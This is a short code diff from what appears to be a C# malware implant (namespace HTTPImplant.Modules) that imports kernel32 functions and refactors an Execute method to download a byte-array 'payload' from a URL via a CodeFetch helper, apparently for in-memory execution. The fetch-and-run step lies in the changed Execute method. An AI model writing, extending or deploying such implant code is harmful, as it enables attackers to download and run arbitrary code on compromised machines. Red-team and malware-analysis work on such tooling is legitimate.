@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Runtime.InteropServices;
-using System.Threading.Tasks;
 
 namespace HTTPImplant.Modules
 {
@@ -24,10 +23,10 @@ namespace HTTPImplant.Modules
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
-        public static async Task Execute(string hostname, string port, string file)
+        public static void Execute(string url)
         {
 
-            byte[] payload = await CodeFetch.FetchCode(hostname, port, file);
+            byte[] payload = CodeFetch.FetchCode(url);
             if (payload == null)
             {
             }
